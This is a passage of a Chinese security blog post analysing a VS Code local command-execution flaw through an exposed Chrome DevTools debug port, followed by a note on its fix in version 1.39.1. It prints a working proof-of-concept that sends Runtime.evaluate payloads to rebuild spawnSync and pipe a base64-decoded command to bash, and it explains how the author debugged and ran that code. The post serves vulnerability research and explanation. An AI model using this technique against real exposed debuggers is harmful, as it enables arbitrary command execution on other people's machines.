+        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawn_sync = process.binding(&#39;spawn_sync&#39;); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;&amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&#39; &#39;);typeof a.shell===&#39;string&#39;?c=a.shell:c=&#39;/bin/sh&#39;,b=[&#39;-c&#39;,g];}typeof a.argv0===&#39;string&#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+&#39;=&#39;+d[f]);return{file:c,args:b,options:a,envPairs:e};}`</span>
+      <span class="p">}</span>
+    <span class="p">}))</span>
+
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+      <span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span>
+      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
+        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:&#39;pipe&#39;,readable:!0,writable:!1},{type:&#39;pipe&#39;,readable:!1,writable:!0},{type:&#39;pipe&#39;,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c&lt;a.stdio.length;c++){var e=a.stdio[c]&amp;&amp;a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&amp;&amp;a.encoding&amp;&amp;a.encoding!==&#39;buffer&#39;)for(c=0;c&lt;b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&amp;&amp;b.output[1],b.stderr=b.output&amp;&amp;b.output[2],b.error&amp;&amp;(b.error= b.error + &#39;spawnSync &#39;+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}`</span>
+      <span class="p">}</span>
+    <span class="p">}))</span>
+
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[!] Executing: </span><span class="si">${</span><span class="nx">COMMAND</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+      <span class="nx">id</span><span class="o">:</span> <span class="mi">3</span><span class="p">,</span>
+      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
+        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawnSync(&#39;/bin/bash&#39;, [&#39;-c&#39;, &#39;echo </span><span class="si">${</span><span class="nx">COMMAND_B64</span><span class="si">}</span><span class="sb"> | base64 -d | /bin/bash&#39;])`</span>
+      <span class="p">}</span>
+    <span class="p">}))</span>
+
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
+  <span class="p">}</span>
+
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="c1">// console.log(event)
+</span><span class="c1"></span>  <span class="p">}</span>
+
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">onclose</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="c1">// console.log(event)
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">wasClean</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[?] Connection closed cleanly&#39;</span><span class="p">)</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[?] Connection died&#39;</span><span class="p">)</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>执行命令是<code>node poc.js [HOST] [PORT] [CMD]</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">node poc.js <span class="m">127</span>.0.0.1 <span class="m">13611</span> <span class="s2">&#34;pwd &gt;/tmp/a&#34;</span>
+cat /tmp/a</code></pre></td></tr></table>
+</div>
+</div>
+<p>我用上面的命令尝试了几次都没有成功往/tmp/a中写入东西，于是开始着手分析poc代码。</p>
+
+<p>getWsLink函数通过<code>http://127.0.0.1:13611/json</code>拿到webSocketDebuggerUrl。之后这个url被用来进行websocket连接。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">async</span> <span class="kd">function</span> <span class="nx">getWsLink</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
+  <span class="k">return</span> <span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">webSocketDebuggerUrl</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>建立连接之后发送了4个数据包，这种数据包的协议是<code>Chrome DevTools Protocol</code>，大致结构是这样的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="p">{</span>
+	<span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;xxx&#39;</span><span class="p">,</span>
+  <span class="nx">params</span><span class="o">:</span> <span class="p">{}</span> <span class="c1">//可选
+</span><span class="c1"></span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>这种协议一般用来调试和优化Chromium, Chrome浏览器，查阅文档可以找到poc中使用的两种method。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105132516575.png" alt="image-20191105132516575" /></p>
+
+<p><img src="/img/vscode-local-execute/image-20191105132915626.png" alt="image-20191105132915626" /></p>
+
+<p>可以看到两种method都在Runtime Domain分类下面，Runtime Domain把Javascript runtime暴露在远程连接中，且副作用持久化。<code>Runtime.enable</code>使能执行环境、<code>Runtime.evaluate</code>用来执行命令。</p>
+
+<p>之后就需要知道发送的这几个expression里面有什么，把几个包中的expression展开、<a href="https://beautifier.io/" target="_blank">美化</a>之后，可以看地更清晰一些：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="c1">// id=2
+</span><span class="c1"></span><span class="nx">spawn_sync</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">binding</span><span class="p">(</span><span class="s1">&#39;spawn_sync&#39;</span><span class="p">);</span>
+
+<span class="nx">normalizeSpawnArguments</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//解析参数，c:process, b:args, a:options
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="o">?</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[]),</span> <span class="nx">a</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="p">{}),</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span> <span class="nx">a</span><span class="p">),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kr">const</span> <span class="nx">g</span> <span class="o">=</span> <span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">concat</span><span class="p">(</span><span class="nx">b</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>
+        <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">?</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span> <span class="o">:</span> <span class="nx">c</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh&#39;</span><span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="nx">g</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">?</span> <span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span><span class="p">)</span> <span class="o">:</span> <span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">env</span> <span class="o">||</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">f</span> <span class="k">in</span> <span class="nx">d</span><span class="p">)</span> <span class="nx">e</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">f</span> <span class="o">+</span> <span class="s1">&#39;=&#39;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">[</span><span class="nx">f</span><span class="p">]);</span> <span class="c1">//加入环境变量
+</span><span class="c1"></span>    <span class="k">return</span> <span class="p">{</span>
+        <span class="nx">file</span><span class="o">:</span> <span class="nx">c</span><span class="p">,</span>
+        <span class="nx">args</span><span class="o">:</span> <span class="nx">b</span><span class="p">,</span>
+        <span class="nx">options</span><span class="o">:</span> <span class="nx">a</span><span class="p">,</span>
+        <span class="nx">envPairs</span><span class="o">:</span> <span class="nx">e</span>
+    <span class="p">};</span>
+<span class="p">}</span>
+
+<span class="c1">// id=3
+</span><span class="c1"></span><span class="nx">spawnSync</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="c1">//主函数，用来执行命令
+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">normalizeSpawnArguments</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">arguments</span><span class="p">);</span> 
+    <span class="c1">// arguments是函数的参数，https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments
+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">options</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">c</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">file</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">args</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">envPairs</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">envPairs</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span> <span class="o">=</span> <span class="p">[{</span>
+            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
+            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span>
+        <span class="p">},</span> <span class="p">{</span>
+            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
+            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
+        <span class="p">},</span> <span class="p">{</span>
+            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
+            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
+        <span class="p">}],</span> <span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="nx">g</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">input</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">e</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
+            <span class="nx">isUint8Array</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">?</span> <span class="nx">f</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">:</span> <span class="nx">f</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">spawn_sync</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span> <span class="o">!==</span> <span class="s1">&#39;buffer&#39;</span><span class="p">)</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="k">continue</span><span class="p">;</span>
+            <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stdout</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stderr</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">+</span> <span class="s1">&#39;spawnSync &#39;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">path</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">spawnargs</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span> <span class="nx">b</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 加的辅助调试内容
+</span><span class="c1"></span><span class="kd">function</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="kr">const</span> <span class="nx">COMMAND</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="kr">const</span> <span class="nx">COMMAND_B64</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">COMMAND</span><span class="p">)</span>
+
+<span class="c1">//id=4
+</span><span class="c1"></span><span class="nx">spawnSync</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="sb">`echo </span><span class="si">${</span><span class="nx">COMMAND_B64</span><span class="si">}</span><span class="sb"> | base64 -d | /bin/bash`</span><span class="p">])</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>id为2和3的表达式中定义了函数<code>spawnSync</code>，其中处理了诸如环境变量，输入输出这些细节。id为4的表达式中调用spawnSync来执行终端中传入的命令。</p>
+
+<p>可以看到spawnSync函数返回了执行结果的stdout以及stderr，于是我修改了poc，把执行结果放入一个变量中，通过前面的文档可以知道，这种远程执行是有”副作用“的，所以在Chrome中的调试界面应该能打印这个变量，就可以看到报错信息。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105135602718.png" alt="image-20191105135602718" /></p>
+
+<p><img src="/img/vscode-local-execute/image-20191105135720029.png" alt="image-20191105135720029" /></p>
+
+<p>原来是mac上base64工具的参数和linux上的不太一样，🤦‍♀️。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ base64 --help
+Usage:	base64 <span class="o">[</span>-hvD<span class="o">]</span> <span class="o">[</span>-b num<span class="o">]</span> <span class="o">[</span>-i in_file<span class="o">]</span> <span class="o">[</span>-o out_file<span class="o">]</span>
+  -h, --help     display this message
+  -D, --decode   decodes input
+  -b, --break    <span class="nb">break</span> encoded string into num character lines
+  -i, --input    input file <span class="o">(</span>default: <span class="s2">&#34;-&#34;</span> <span class="k">for</span> stdin<span class="o">)</span>
+  -o, --output   output file <span class="o">(</span>default: <span class="s2">&#34;-&#34;</span> <span class="k">for</span> stdout<span class="o">)</span>
+  
+root@kali:~# base64 --help
+Usage: base64 <span class="o">[</span>OPTION<span class="o">]</span>... <span class="o">[</span>FILE<span class="o">]</span>
+Base64 encode or decode FILE, or standard input, to standard output.
+With no FILE, or when FILE is -, <span class="nb">read</span> standard input.
+Mandatory arguments to long options are mandatory <span class="k">for</span> short options too.
+  -d, --decode          decode data
+  ........</code></pre></td></tr></table>
+</div>
+</div>
+<p>把poc中的<code>base64 -d</code>换成<code>base64 -D</code>之后执行成功了。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105140552406.png" alt="image-20191105140552406" /></p>
+
+<h1 id="修复"><a href="#修复" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>修复</h1>
+
+<p>此漏洞在<strong>1.39.1</strong>版本中得到<a href="https://github.com/microsoft/vscode/commit/7f87a64621b010ed8a7e171d07583921e8c1e8ac?diff=split" target="_blank">修复</a>，默认情况下不再开启调试端口。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105141538183.png" alt="image-20191105141538183" /></p>
+
